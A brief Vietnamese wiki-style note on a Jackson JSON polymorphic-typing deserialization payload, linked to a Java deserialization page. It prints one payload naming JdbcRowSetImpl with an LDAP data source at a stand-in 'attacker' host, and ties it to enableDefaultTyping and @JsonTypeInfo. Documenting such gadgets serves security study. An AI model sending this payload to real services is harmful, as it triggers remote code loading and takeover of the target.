---
title: Jackson JSON Typing Payload
type: entity
related: [[Java Deserialization]]
---

Payload Jackson/JSON typing được nhắc đến:

```json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker/o", "autoCommit":true}]
```

Payload này liên quan đến `enableDefaultTyping` hoặc `@JsonTypeInfo` khi cho phép attacker-chosen types.